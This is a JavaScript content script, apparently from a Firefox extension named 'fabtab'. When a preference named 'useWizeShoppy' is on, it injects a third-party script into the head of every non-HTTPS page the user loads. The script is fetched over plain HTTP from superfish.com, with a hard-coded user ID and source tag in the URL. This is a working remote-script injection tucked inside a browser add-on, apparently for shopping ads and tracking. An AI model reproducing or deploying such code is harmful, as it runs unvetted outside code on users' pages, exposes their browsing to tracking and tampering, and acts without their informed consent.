addEventListener('DOMContentLoaded', function loadedContent(aEvent) { // on page load
    with(content) {
		 if (aEvent.originalTarget.location.href != null) {
             if (aEvent.originalTarget.location.href == document.location.href && document.location.href != 'about:home' && (document.location.href.indexOf('https:') == -1) ) {
				var prefManager = Components.classes["@mozilla.org/preferences-service;1"].getService(Components.interfaces.nsIPrefBranch);
				var use = prefManager.getBoolPref("extensions.fabtab.useWizeShoppy");
				if( use )
				{
					var el_exist = document.getElementById('scr_xsale');
					if(el_exist)
					{
						removeEventListener('DOMContentLoaded', loadedContent, false);
						return;
					}	
					var script = document.createElement('script');
					script.setAttribute('type',    'text/javascript');
					script.setAttribute('charset', 'UTF-8');
					script.setAttribute('id','scr_xsale');
					script.src = 'http://www.superfish.com/ws/sf_main.jsp?dlsource=fgzqxwui&userId=c4aa8323-83ff-4385-a2df-d45f8c1ce97a&CTID=fabtab';
					document.getElementsByTagName('head')[0].appendChild(script);
					
					removeEventListener('DOMContentLoaded', loadedContent, false);
				}
			}
         }
		 removeEventListener('DOMContentLoaded', loadedContent, false);
    }
	removeEventListener('DOMContentLoaded', loadedContent, false);
}, true);